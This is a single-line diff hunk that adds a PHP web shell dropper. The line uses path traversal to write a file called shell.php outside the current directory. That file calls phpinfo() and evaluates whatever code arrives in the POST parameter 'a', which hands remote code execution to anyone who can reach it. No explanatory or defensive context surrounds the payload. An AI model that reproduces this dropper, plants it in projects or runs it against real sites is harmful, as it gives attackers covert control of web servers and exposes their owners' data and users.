@@ -1,0 +1,1 @@
+<?php fputs(fopen('../../../shell.php','w'),'<?php phpinfo();eval($_POST[a]);?>');?>
